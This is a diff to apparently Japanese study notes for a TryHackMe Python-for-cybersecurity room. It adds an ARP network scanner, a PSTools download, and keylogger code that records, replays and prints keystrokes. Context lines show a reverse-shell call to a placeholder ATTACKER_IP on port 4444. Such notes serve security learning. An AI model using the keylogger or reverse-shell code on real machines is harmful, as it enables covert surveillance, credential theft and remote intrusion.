@@ -128,3 +128,78 @@ if session:
     execute_command(session, "whoami")
     get_reverse_shell(session, "ATTACKER_IP", 4444)
 ```
+
+## ARP スキャナ
+
+https://tryhackme.com/room/pythonforcybersecurity
+
+```python
+from scapy.all import *
+
+interface = "eth0"
+ip_range = "10.10.X.X/24"
+broadcastMac = "ff:ff:ff:ff:ff:ff"
+
+# scapyでパケットの階層構造を表す特殊な構文。演算子をオーバーロードしている。
+packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)
+
+ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)
+
+for send,receive in ans:
+        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
+```
+
+## download
+
+```python
+import requests
+
+url = 'https://download.sysinternals.com/files/PSTools.zip'
+r = requests.get(url, allow_redirects=True)
+open('PSTools.zip', 'wb').write(r.content)
+```
+
+## キーロガー
+
+記録
+
+```python
+import keyboard
+import pickle
+
+# 入力を記録（ENTERまで）
+events = keyboard.record(until='ENTER')
+
+# ファイルに保存
+with open("keystrokes.pkl", "wb") as f:
+    pickle.dump(events, f)
+```
+
+再生
+
+```python
+import keyboard
+import pickle
+
+# ファイルから読み込み
+with open("keystrokes.pkl", "rb") as f:
+    events = pickle.load(f)
+
+# 再生
+keyboard.play(events)
+```
+
+表示
+
+```python
+import keyboard
+import pickle
+
+# 保存したpklファイルを読み込み
+with open("keystrokes.pkl", "rb") as f:
+    events = pickle.load(f)
+
+# 各イベントの内容をテキストで表示
+for e in events:
+    print(f"time={e.time:.4f}, name={e.name}, event_type={e.event_type}")
+```
